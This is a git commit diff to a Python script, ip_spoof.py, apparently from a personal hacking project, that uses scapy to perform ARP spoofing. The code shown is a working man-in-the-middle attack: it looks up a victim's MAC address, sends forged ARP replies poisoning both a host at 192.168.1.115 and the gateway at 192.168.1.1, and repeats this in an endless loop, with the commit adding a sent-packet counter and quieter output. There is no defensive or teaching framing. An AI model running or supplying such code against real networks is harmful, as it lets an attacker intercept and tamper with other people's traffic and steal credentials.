0ed6d1e31f6f399d9afe4e861abaf905c39c91c5
dashzou <fxfddfno@gmail.com>
2020-07-01 07:14:56 -0400

    dynamic loop

--- ip_spoof.py
+++ ip_spoof.py
@@ -2,7 +2,6 @@
 import scapy.all as scapy
 import time
 
-
 def get_mac(ip):
     # send packet
     arp_request = scapy.ARP(pdst=ip)
@@ -12,7 +11,7 @@ def get_mac(ip):
 
     # srp send and get response to get mac_target
     answared = scapy.srp(arp_request_boradcast, timeout=10, verbose=False)[0]
-    print(answared)
+    #print(answared)
     #print(answared[0][1].hwsrc)
     return answared[0][1].hwsrc
 
@@ -23,9 +22,12 @@ def spoof(target_ip, spoof_ip):
 	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
 	#print(packet.summary())
 	#print(packet.show())
-	scapy.send(packet)
+	scapy.send(packet, verbose=False)
 
+sent_packets_count = 0
 while True:
 	spoof("192.168.1.115", "192.168.1.1")
 	spoof("192.168.1.1", "192.168.1.115")
+	sent_packets_count = sent_packets_count + 2
+	print(f"\r[+] Send {str(sent_packets_count)} packets", end="")
 	time.sleep(2)
